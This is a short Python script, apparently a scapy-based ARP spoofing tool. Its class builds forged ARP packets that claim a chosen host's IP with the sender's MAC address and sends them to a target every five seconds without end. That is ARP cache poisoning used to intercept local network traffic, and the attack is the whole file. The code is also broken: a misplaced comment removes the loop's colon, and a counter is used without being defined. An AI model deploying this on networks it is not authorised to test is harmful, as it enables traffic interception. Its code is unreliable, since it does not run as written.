import sys
import time
from scapy.all import *

class ArpSpoofing():
    interface = 0

    def __init__(self, intFace):
        self.interface = intFace

    def doSpoof(self, hostToAttack, hostToSpoof):

        #This method obtains your own mac address
        def obtainMac():
            my_macs = [get_if_hwaddr(i) for i in get_if_list()]
            for mac in my_macs:
                if (mac != "00:00:00:00:00:00"):
                    return mac

        print("spoof")

        myMac = obtainMac()
        print("post obtainMac")

        #Ether part of packet
        etherPart = Ether(src=myMac)

        #Arp part of packet
        arpPart = ARP(op="who-has", hwsrc=myMac, psrc=hostToSpoof, pdst=hostToAttack)

        #total packet
        packet = etherPart / arpPart

        #sends packet
        #counter = 5
        while True #counter >= 0:
            sendp(packet, iface=self.interface, verbose=False)
            print("Spoof Spoof")
            counter -= 1
            time.sleep(5)




